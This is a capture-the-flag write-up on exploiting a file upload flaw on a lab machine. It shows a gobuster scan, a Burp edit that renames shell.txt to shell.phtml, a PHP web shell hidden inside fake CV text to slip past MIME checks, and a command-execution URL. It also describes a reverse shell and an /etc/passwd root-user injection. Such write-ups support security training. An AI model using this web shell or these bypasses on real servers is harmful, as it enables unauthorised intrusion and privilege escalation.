Key Concepts
Finding the Upload Path
A critical step in exploiting file upload vulnerabilities is locating where uploaded files are stored on the server. Tools like Gobuster or Dirbuster are used to brute-force directory names and discover the upload path.
bashgobuster dir -u http://10.114.174.16/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,jsonl,log \
  -t 50
In this room, Gobuster revealed:

/uploads — the directory where files are stored and served
/uploads.jsonl — a publicly exposed log file containing the randomized stored filenames

Once the upload directory is identified, the attacker can access the uploaded web shell directly by navigating to the correct path, e.g. http://target/uploads/shell.phtml?cmd=id.

Bypassing Client-Side Filters
Many web applications implement client-side filtering to restrict which file types can be uploaded. These filters operate entirely within the user's browser using JavaScript or HTML accept attributes and are trivially bypassed because they are never enforced on the server.
In this room the upload form declared accepted types via HTML capsules (PDF, DOC, DOCX, ODT, TXT), but this was purely presentational. Using Burp Suite, the attacker intercepted the upload HTTP request mid-flight and modified the filename field from shell.txt to shell.phtml before it reached the server:
# Original intercepted request
Content-Disposition: form-data; name="cv"; filename="shell.txt"
Content-Type: text/plain

# Modified in Burp
Content-Disposition: form-data; name="cv"; filename="shell.phtml"
Content-Type: text/plain
The server accepted the modified request because its extension blacklist did not include .phtml as a blocked extension — a classic example of a blacklist being less secure than a whitelist.

Uploading a Web Shell
A PHP web shell is a simple script that accepts operating system commands via HTTP GET parameters and executes them on the server, returning the output to the attacker's browser.
The shell used in this room:
php<?php system($_GET["cmd"]); ?>
To bypass the server-side MIME type check (which used PHP's finfo to inspect file contents), the PHP payload was embedded inside realistic plain-text CV content. This caused finfo to detect the file as text/plain rather than text/x-php:
John Doe
Software Engineer
john.doe@email.com

EXPERIENCE
Senior Developer at TechCorp 2020-2024
...

<?php system($_GET["cmd"]); ?>
The file was then uploaded as .txt (accepted by MIME check), and Burp Suite was used to rename it to .phtml so Apache would execute it as PHP. Once uploaded, the web shell was triggered by navigating to:
http://10.114.174.16/uploads/ccbe94d9909623a1.phtml?cmd=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

Conclusion
After successfully uploading the malicious .phtml web shell, a reverse shell connection was established back to the attacker's Kali machine using Netcat, giving full interactive access to the server as www-data.
From there:

The user flag was found at /var/www/user.txt
A custom SUID binary (/usr/local/bin/patch_note) was identified and abused by symlinking its target file to /etc/passwd, allowing a new root-level user to be injected
The root flag was retrieved from /root/root.txt

This room demonstrates that file upload vulnerabilities remain one of the most impactful classes of web vulnerabilities. Even when multiple layers of filtering are in place (MIME checks, extension checks, CSRF protection), a combination of techniques — content wrapping, Burp Suite interception, and extension blacklist gaps — can defeat them entirely.

